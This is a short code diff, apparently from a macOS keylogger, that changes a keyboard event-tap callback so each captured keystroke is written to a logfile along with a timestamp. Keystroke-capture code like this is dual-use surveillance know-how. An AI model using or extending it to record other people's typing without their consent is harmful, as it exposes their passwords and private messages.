@@ -105,7 +105,8 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
     // Print the human readable key to the logfile.
     bool shift = flags & kCGEventFlagMaskShift;
     bool caps = flags & kCGEventFlagMaskAlphaShift;
-    fprintf(logfile, "%s", convertKeyCode(keyCode, shift, caps));
+    time_t now = time(NULL);
+    fprintf(logfile, "%s,%ld,\n", convertKeyCode(keyCode, shift, caps), now);
     fflush(logfile);
     return event;
 }
